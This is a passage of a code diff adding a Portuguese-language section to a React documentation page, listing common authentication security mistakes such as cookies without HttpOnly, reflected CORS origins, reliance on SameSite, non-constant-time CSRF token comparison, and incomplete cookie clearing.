+            <AboutCollapse variant='item' title='Outros erros da mesma família'>
+              <div className='flex flex-col gap-y-[12px]'>
+                <p>
+                  <strong>Guardar o token em cookie sem HttpOnly.</strong> Junta o pior dos dois
+                  lados: o JavaScript lê, e o navegador ainda manda sozinho. Cookie sem{' '}
+                  <code className='text-[14px]'>HttpOnly</code> só faz sentido para o{' '}
+                  <code className='text-[14px]'>csrf_token</code>, que não é credencial.
+                </p>
+
+                <p>
+                  <strong>
+                    Resolver CORS com <code className='text-[14px]'>origin: true</code>.
+                  </strong>{' '}
+                  Some o erro do console e some a proteção junto: com{' '}
+                  <code className='text-[14px]'>credentials: true</code>, refletir a origem autoriza
+                  qualquer site a ler respostas autenticadas.
+                </p>
+
+                <p>
+                  <strong>Achar que SameSite basta.</strong> Ele cobre cross-site, não subdomínio
+                  irmão. Um preview deploy esquecido é same-site e passa por essa camada.
+                </p>
+
+                <p>
+                  <strong>
+                    Comparar token de CSRF com <code className='text-[14px]'>===</code>.
+                  </strong>{' '}
+                  Vaza o valor caractere a caractere pelo tempo de resposta. Sempre{' '}
+                  <code className='text-[14px]'>timingSafeEqual</code>.
+                </p>
+
+                <p>
+                  <strong>Limpar cookie sem repetir os atributos.</strong>{' '}
+                  <code className='text-[14px]'>clearCookie(&apos;refresh_token&apos;)</code> sem{' '}
+                  <code className='text-[14px]'>path: &apos;/auth&apos;</code> não apaga nada, e o
+                  logout deixa a credencial de 14 dias viva no navegador.
+                </p>
+              </div>
+            </AboutCollapse>
+          </div>
+        </div>
+      </AboutCollapse>
     </AboutCollapse>
 
-    <AboutCollapse variant='section' defaultOpen title='Fluxo'>
+    <AboutCollapse defaultOpen title='Fluxo' variant='section'>
       <AboutCollapse defaultOpen title='Login, passo a passo'>
         <div className='flex flex-col gap-y-[24px]'>
           <p>
